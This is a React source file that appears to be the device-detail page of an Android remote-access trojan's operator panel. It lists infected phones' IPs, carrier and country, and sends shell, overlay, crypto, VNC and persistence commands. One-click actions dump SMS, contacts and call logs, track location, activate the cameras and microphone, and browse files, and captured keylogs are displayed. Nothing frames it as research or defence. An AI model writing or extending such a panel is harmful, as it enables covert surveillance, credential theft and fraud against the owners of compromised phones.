import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useAPI } from '../hooks/useAPI.js';
import {
  getDevice,
  sendCommand,
  deleteDevice,
  updateDevice,
} from '../lib/api.js';
import KeylogViewer from '../components/KeylogViewer.jsx';

export default function DeviceDetail() {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data, loading, refetch } = useAPI(() => getDevice(id), [id]);

  const [commandType, setCommandType] = useState('shell');
  const [commandPayload, setCommandPayload] = useState('');
  const [sending, setSending] = useState(false);
  const [editingName, setEditingName] = useState(false);
  const [name, setName] = useState('');

  useEffect(() => {
    if (data?.device) {
      setName(data.device.name || '');
    }
  }, [data]);

  if (loading) {
    return (
      <div className="flex items-center justify-center py-16">
        <div className="w-6 h-6 border-2 border-accent border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  if (!data?.device) {
    return (
      <div className="text-center py-16">
        <p className="text-sm text-surface-400">Device not found</p>
        <button onClick={() => navigate('/devices')} className="text-xs text-accent mt-2 hover:underline">
          Back to devices
        </button>
      </div>
    );
  }

  const device = data.device;
  const commands = data.commands || [];
  const keylogs = data.keylogs || [];

  const handleSendCommand = async () => {
    if (!commandPayload.trim()) return;
    setSending(true);
    try {
      await sendCommand(id, commandType, commandPayload);
      setCommandPayload('');
      refetch();
    } catch (err) {
      alert('Error: ' + err.message);
    } finally {
      setSending(false);
    }
  };

  const handleDelete = async () => {
    if (!confirm('Remove this device from the panel?')) return;
    try {
      await deleteDevice(id);
      navigate('/devices');
    } catch (err) {
      alert('Error: ' + err.message);
    }
  };

  const handleSaveName = async () => {
    try {
      await updateDevice(id, { name });
      setEditingName(false);
      refetch();
    } catch (err) {
      alert('Error: ' + err.message);
    }
  };

  const batteryColor =
    device.battery_level >= 80
      ? 'text-success'
      : device.battery_level >= 30
        ? 'text-warning'
        : 'text-danger';

  return (
    <div className="space-y-6 animate-slide-in">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <button
            onClick={() => navigate('/devices')}
            className="text-xs text-surface-400 hover:text-gray-100 transition-colors"
          >
            ← Back
          </button>
          <div>
            {editingName ? (
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={name}
                  onChange={e => setName(e.target.value)}
                  autoFocus
                  className="h-7 px-2 text-sm bg-surface-800 border border-surface-700 rounded text-gray-200 outline-none focus:border-accent/50"
                />
                <button
                  onClick={handleSaveName}
                  className="h-7 px-2 text-xs bg-accent text-white rounded"
                >
                  Save
                </button>
                <button
                  onClick={() => setEditingName(false)}
                  className="h-7 px-2 text-xs text-surface-400 hover:text-gray-100"
                >
                  Cancel
                </button>
              </div>
            ) : (
              <h1
                className="text-lg font-semibold text-gray-100 cursor-pointer hover:text-accent transition-colors"
                onClick={() => setEditingName(true)}
              >
                {device.name || device.model || 'Unknown Device'}
                <span className="text-surface-500 text-xs ml-2">✎</span>
              </h1>
            )}
            <div className="flex items-center gap-2 mt-0.5">
              <span className={`status-dot ${device.is_online ? 'online' : 'offline'}`} />
              <span className={`text-xs ${device.is_online ? 'text-success' : 'text-surface-400'}`}>
                {device.is_online ? 'Online' : 'Offline'}
              </span>
              <span className="text-surface-600">|</span>
              <span className="text-xs text-surface-400 font-mono">{device.id}</span>
            </div>
          </div>
        </div>
        <button
          onClick={handleDelete}
          className="h-8 px-3 text-xs bg-danger/10 hover:bg-danger/20 text-danger rounded transition-colors"
        >
          Remove Device
        </button>
      </div>

      {/* Device info grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        {/* Left column — device details */}
        <div className="lg:col-span-2 grid grid-cols-2 sm:grid-cols-3 gap-4">
          {[
            { label: 'Manufacturer', value: device.manufacturer },
            { label: 'Model', value: device.model },
            { label: 'Android Version', value: device.android_version },
            { label: 'SDK Version', value: device.sdk_version },
            { label: 'Security Patch', value: device.security_patch },
            { label: 'Carrier', value: device.carrier },
            { label: 'Public IP', value: device.public_ip, mono: true },
            { label: 'Local IP', value: device.local_ip, mono: true },
            { label: 'Signal Strength', value: device.signal_strength ? `${device.signal_strength} dBm` : '—' },
            {
              label: 'Battery',
              value: device.battery_level >= 0 ? `${device.battery_level}%` : '—',
              color: batteryColor,
              extra: device.is_charging ? '⚡' : '',
            },
            { label: 'Country', value: device.country },
            { label: 'Last Seen', value: device.last_seen_at ? new Date(device.last_seen_at).toLocaleString() : '—' },
          ].map(item => (
            <div key={item.label} className="bg-surface-900 border border-surface-800 rounded-lg p-3">
              <p className="text-[10px] text-surface-500 font-mono uppercase tracking-wider">{item.label}</p>
              <p className={`text-sm mt-0.5 ${item.color || 'text-gray-200'} ${item.mono ? 'font-mono text-xs' : ''}`}>
                {item.value || '—'}
                {item.extra && <span className="ml-1">{item.extra}</span>}
              </p>
            </div>
          ))}
        </div>

        {/* Right column — command shell */}
        <div className="lg:col-span-1 space-y-3">
          <div className="bg-surface-900 border border-surface-800 rounded-lg p-4">
            <p className="text-xs text-surface-400 font-mono uppercase tracking-wider mb-3">Command</p>
            <div className="space-y-2">
              <select
                value={commandType}
                onChange={e => setCommandType(e.target.value)}
                className="w-full h-8 px-2 text-xs bg-surface-800 border border-surface-700 rounded text-gray-200 outline-none focus:border-accent/50"
              >
                <option value="shell">Shell</option>
                <option value="sensor">Sensor</option>
                <option value="overlay">Overlay</option>
                <option value="crypto">Crypto</option>
                <option value="vnc">VNC</option>
                <option value="persist">Persistence</option>
              </select>
              <textarea
                value={commandPayload}
                onChange={e => setCommandPayload(e.target.value)}
                placeholder="Command payload..."
                rows={4}
                className="w-full px-3 py-2 text-xs bg-surface-800 border border-surface-700 rounded text-gray-200 placeholder-surface-500 outline-none focus:border-accent/50 font-mono resize-none"
              />
              <button
                onClick={handleSendCommand}
                disabled={!commandPayload.trim() || sending}
                className="w-full h-8 text-xs bg-accent hover:bg-accent-dark text-white rounded disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                {sending ? 'Sending...' : 'Send'}
              </button>
            </div>
          </div>

          {/* Quick actions */}
          <div className="bg-surface-900 border border-surface-800 rounded-lg p-4">
            <p className="text-xs text-surface-400 font-mono uppercase tracking-wider mb-2">Quick Actions</p>
            <div className="grid grid-cols-2 gap-1.5">
              {[
                { label: 'Get Info', cmd: 'info' },
                { label: 'Dump SMS', cmd: 'sms_dump' },
                { label: 'Dump Contacts', cmd: 'contacts_dump' },
                { label: 'Get Location', cmd: 'location' },
                { label: 'Front Camera', cmd: 'camera_front' },
                { label: 'Rear Camera', cmd: 'camera_rear' },
                { label: 'Start Mic', cmd: 'mic_start' },
                { label: 'Dump Calls', cmd: 'calls_dump' },
                { label: 'List Apps', cmd: 'apps_list' },
                { label: 'File Browser', cmd: 'file_browser' },
              ].map(action => (
                <button
                  key={action.cmd}
                  onClick={async () => {
                    try {
                      await sendCommand(id, 'shell', action.cmd);
                    } catch (err) {
                      alert(err.message);
                    }
                  }}
                  className="h-7 text-[11px] bg-surface-800 hover:bg-surface-700 text-gray-300 rounded transition-colors"
                >
                  {action.label}
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Recent commands */}
      <div>
        <h2 className="text-sm font-medium text-gray-100 mb-3">
          Recent Commands
          <span className="text-surface-500 ml-2 text-xs">({commands.length})</span>
        </h2>
        <div className="bg-surface-900 border border-surface-800 rounded-lg max-h-48 overflow-y-auto">
          {commands.length === 0 && (
            <p className="text-xs text-surface-500 text-center py-4">No commands sent</p>
          )}
          {commands.map(cmd => (
            <div
              key={cmd.id}
              className="flex items-start gap-3 px-4 py-2 border-b border-surface-800 last:border-0 text-xs font-mono"
            >
              <span className="text-surface-500 whitespace-nowrap">
                {new Date(cmd.created_at).toLocaleTimeString()}
              </span>
              <span className={`px-1.5 py-0.5 rounded text-[10px] ${
                cmd.status === 'completed' ? 'bg-success/10 text-success' :
                cmd.status === 'failed' ? 'bg-danger/10 text-danger' :
                cmd.status === 'pending' ? 'bg-warning/10 text-warning' :
                'bg-surface-800 text-surface-400'
              }`}>
                {cmd.status}
              </span>
              <span className="text-accent">{cmd.type}</span>
              <span className="text-gray-400 truncate flex-1">
                {typeof cmd.payload === 'string' ? cmd.payload.slice(0, 100) : JSON.stringify(cmd.payload).slice(0, 100)}
              </span>
            </div>
          ))}
        </div>
      </div>

      {/* Keylogs */}
      <div>
        <h2 className="text-sm font-medium text-gray-100 mb-3">
          Keylogs
          <span className="text-surface-500 ml-2 text-xs">({keylogs.length})</span>
        </h2>
        <div className="bg-surface-900 border border-surface-800 rounded-lg p-4">
          <KeylogViewer keylogs={keylogs} />
        </div>
      </div>
    </div>
  );
}
